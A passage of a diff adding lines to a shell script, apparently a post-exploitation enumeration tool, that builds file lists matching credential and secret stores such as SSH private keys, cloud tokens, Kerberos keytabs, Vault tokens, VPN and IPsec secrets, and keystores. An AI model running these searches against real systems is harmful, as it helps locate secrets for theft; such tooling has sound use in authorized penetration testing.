+    PSTORAGE_HOSTAPD=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "hostapd\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_ANACONDA_KS=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "anaconda-ks\.cfg$" | sort | uniq | head -n 70)
+    PSTORAGE_RACOON=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "racoon\.conf$|psk\.txt$" | sort | uniq | head -n 70)
+    PSTORAGE_VNC=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.vnc$|.*vnc.*\.c.*nf.*$|.*vnc.*\.ini$|.*vnc.*\.txt$|.*vnc.*\.xml$" | sort | uniq | head -n 70)
+    PSTORAGE_LDAP=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "ldap$" | sort | uniq | head -n 70)
+    PSTORAGE_OPENVPN=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.ovpn$" | sort | uniq | head -n 70)
+    PSTORAGE_SSH=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "id_dsa.*$|id_rsa.*$|known_hosts$|authorized_hosts$|authorized_keys$" | sort | uniq | head -n 70)
+    PSTORAGE_CERTSB4=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E '^/usr/share/|^/etc/ssl/|^/usr/local/lib/|^/usr/lib.*' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.pem$|.*\.cer$|.*\.crt$" | sort | uniq | head -n 70)
+    PSTORAGE_CERTSBIN=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E '^/usr/share/|^/etc/ssl/|^/usr/local/lib/|^/usr/lib/.*' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.csr$|.*\.der$" | sort | uniq | head -n 70)
+    PSTORAGE_CERTSCLIENT=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E '^/usr/share/|^/etc/ssl/|^/usr/local/lib/|^/usr/lib/.*' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.pfx$|.*\.p12$" | sort | uniq | head -n 70)
+    PSTORAGE_SSH_AGENTS=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/private|^/tmp" | grep -E "agent.*$" | sort | uniq | head -n 70)
+    PSTORAGE_SSH_CONFIG=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/usr|^$GREPHOMESEARCH" | grep -E "ssh.*config$" | sort | uniq | head -n 70)
+    PSTORAGE_CLOUD_CREDENTIALS=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "credentials$|credentials\.db$|legacy_credentials\.db$|access_tokens\.db$|access_tokens\.json$|accessTokens\.json$|azureProfile\.json$|TokenCache\.dat$|AzureRMContext\.json$|\.bluemix$" | sort | uniq | head -n 70)
+    PSTORAGE_KERBEROS=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "krb5\.conf$|krb5\.keytab$|\.k5login$|kadm5\.acl$|secrets\.ldb$|\.secrets\.mkey$|sssd\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_KIBANA=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "kibana\.y.*ml$" | sort | uniq | head -n 70)
+    PSTORAGE_KNOCKD=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E '/etc/init.d/' | grep -E "^/etc" | grep -E ".*knockd.*$" | sort | uniq | head -n 70)
+    PSTORAGE_LOGSTASH=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "logstash$" | sort | uniq | head -n 70)
+    PSTORAGE_ELASTICSEARCH=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "elasticsearch\.y.*ml$" | sort | uniq | head -n 70)
+    PSTORAGE_VAULT_SSH_HELPER=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "vault-ssh-helper\.hcl$" | sort | uniq | head -n 70)
+    PSTORAGE_VAULT_SSH_TOKEN=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.vault-token$" | sort | uniq | head -n 70)
+    PSTORAGE_COUCHDB=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "couchdb$" | sort | uniq | head -n 70)
+    PSTORAGE_REDIS=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "redis\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_MOSQUITTO=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "mosquitto\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_NEO4J=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "neo4j$" | sort | uniq | head -n 70)
+    PSTORAGE_CLOUD_INIT=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "cloud\.cfg$" | sort | uniq | head -n 70)
+    PSTORAGE_ERLANG=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.erlang\.cookie$" | sort | uniq | head -n 70)
+    PSTORAGE_GMV_AUTH=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "gvm-tools\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_IPSEC=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "ipsec\.secrets$|ipsec\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_IRSSI=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.irssi$" | sort | uniq | head -n 70)
+    PSTORAGE_KEYRING=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "keyrings$|.*\.keyring$|.*\.keystore$|.*\.jks$" | sort | uniq | head -n 70)
+    PSTORAGE_FILEZILLA=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "filezilla$|filezilla\.xml$|recentservers\.xml$" | sort | uniq | head -n 70)
+    PSTORAGE_BACKUP_MANAGER=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "storage\.php$|database\.php$" | sort | uniq | head -n 70)
+    PSTORAGE_SPLUNK=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "passwd$" | sort | uniq | head -n 70)
